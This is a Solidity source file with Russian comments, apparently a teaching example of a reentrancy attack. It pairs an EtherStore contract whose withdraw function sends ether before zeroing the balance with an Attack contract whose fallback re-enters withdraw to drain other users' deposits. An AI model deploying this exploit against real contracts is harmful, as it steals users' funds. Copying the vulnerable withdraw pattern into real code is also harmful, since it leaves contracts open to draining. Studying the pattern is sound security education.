// SPDX-License-Identifier: MIT
// compiler version must be greater than or equal to 0.8.20 and less than 0.9.0
pragma solidity ^0.8.23;
/* EtherStore - это контракт, в котором вы можете пополнять и выводить ETH.
Этот контракт уязвим для атаки повторного входа.
Давайте разберемся, почему.

1. Разверните EtherStore
2. Внесите по 1 эфиру со счета 1 (Алиса) и счета 2 (Боб) в EtherStore
3. Развернуть атаку с адресом EtherStore
4. Вызовите Attack.attack, отправив 1 эфир (используя Аккаунт 3 (Ева)).
 Вы получите обратно 3 эфира (2 эфира, украденные у Алисы и Боба,
 плюс 1 эфир, отправленный из этого контракта).

Что случилось?
Ранее атаке удалось вызвать EtherStore.withdraw несколько раз
EtherStore.withdraw завершил выполнение.

Вот как назывались функции
- Атака.атака
- EtherStore.депозит
- EtherStore.вывести
- Запасной вариант атаки (получает 1 Эфир)
- EtherStore.вывести
- Attack.fallback (получает 1 Эфир)
- EtherStore.вывести
- Резервная атака (получает 1 Эфир) */
contract EtherStore {
    mapping (address => uint) public  balances;
    function deposit() public  payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
    //вспомогательная функция для проверки баланса этого контракта 
    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}
contract Attack {
    EtherStore public etherStore;
    uint256 constant public AMOUNT = 1 ether;
    constructor(address _etherStoreAddress){
        etherStore = EtherStore(_etherStoreAddress);
    }
    //fallback вызывается когда etherstore отправляет ether в этот контракт 
    fallback() external payable { 
        if (address(etherStore).balance >= AMOUNT){
            etherStore.withdraw();
        }
    }
    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }
    //вспомогательная функция для проверки баланса этого контракта 
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}